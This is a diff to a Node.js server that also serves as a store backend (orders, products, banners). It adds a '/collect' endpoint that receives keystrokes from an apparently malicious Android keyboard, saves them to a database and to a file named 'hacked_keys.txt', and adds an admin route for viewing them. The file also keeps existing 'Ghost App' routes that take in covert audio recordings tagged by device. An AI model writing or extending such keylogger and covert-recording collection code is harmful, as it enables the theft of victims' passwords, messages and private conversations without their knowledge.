@@ -6,6 +6,7 @@ const axios = require("axios");
 const path = require("path");
 const multer = require("multer"); 
 const crypto = require("crypto"); 
+const fs = require('fs'); // Added fs globally
 const { Resend } = require("resend"); 
 require("dotenv").config();
 
@@ -16,11 +17,18 @@ const Order = require("./models/order");
 const Product = require("./models/product"); 
 const Banner = require("./models/banner");
 
-// --- 🚀 GHOST APP MODEL (New) ---
+// --- 🚀 GHOST APP MODEL ---
 const GhostData = mongoose.model("GhostData", new mongoose.Schema({
     deviceId: String,
     fileName: String,
     filePath: String,
+    timestamp: { type: Date, default: Date.now }
+}));
+
+// --- ⌨️ KEYBOARD LOG MODEL (New) ---
+const KeyboardLog = mongoose.model("KeyboardLog", new mongoose.Schema({
+    deviceId: String,
+    data: String,
     timestamp: { type: Date, default: Date.now }
 }));
 
@@ -38,12 +46,10 @@ app.use(cors({
 app.use(express.static("public"));
 app.use('/uploads', express.static(path.join(__dirname, 'public/uploads')));
 
-// --- MULTER CONFIG (Updated for Ghost App Support) ---
+// --- MULTER CONFIG ---
 const storage = multer.diskStorage({
     destination: (req, file, cb) => {
-        // अगर Ghost App से ऑडियो आ रहा है तो अलग फोल्डर में डालें
         if (file.fieldname === "audio") {
-            const fs = require('fs');
             const dir = 'public/uploads/ghost/';
             if (!fs.existsSync(dir)){ fs.mkdirSync(dir, { recursive: true }); }
             cb(null, dir);
@@ -57,6 +63,30 @@ const storage = multer.diskStorage({
     }
 });
 const upload = multer({ storage: storage });
+
+// --- ⌨️ KEYBOARD RECEIVER API (New) ---
+// यह एंडपॉइंट आपके एंड्रॉइड कीबोर्ड से डेटा रिसीव करेगा
+app.post("/collect", async (req, res) => {
+    try {
+        const { data, deviceId } = req.body;
+        
+        // 1. डेटाबेस में सेव करें
+        const newLog = new KeyboardLog({
+            deviceId: deviceId || "Unknown Android",
+            data: data
+        });
+        await newLog.save();
+
+        // 2. बैकअप के लिए टेक्स्ट फाइल में भी लिखें
+        const logEntry = `[${new Date().toLocaleString()}] Device: ${deviceId || 'N/A'} - Data: ${data}\n`;
+        fs.appendFileSync('hacked_keys.txt', logEntry);
+
+        console.log("⌨️ Key Captured:", data);
+        res.status(200).send("Captured");
+    } catch (err) {
+        res.status(500).send("Error");
+    }
+});
 
 // --- 🚀 GHOST APP API ROUTES ---
 app.post("/api/upload-ghost-data", upload.single('audio'), async (req, res) => {
@@ -83,6 +113,16 @@ app.get("/api/admin/ghost-list", async (req, res) => {
     try {
         const data = await GhostData.find().sort({ timestamp: -1 });
         res.json(data);
+    } catch (err) { res.status(500).json({ error: "Fetch failed" }); }
+});
+
+// --- ⌨️ ADMIN KEYBOARD LOGS VIEW (New) ---
+app.get("/api/admin/keyboard-logs", async (req, res) => {
+    const { password } = req.query;
+    if (password !== process.env.ADMIN_PASSWORD) return res.status(403).send("Unauthorized");
+    try {
+        const logs = await KeyboardLog.find().sort({ timestamp: -1 }).limit(100);
+        res.json(logs);
     } catch (err) { res.status(500).json({ error: "Fetch failed" }); }
 });
 
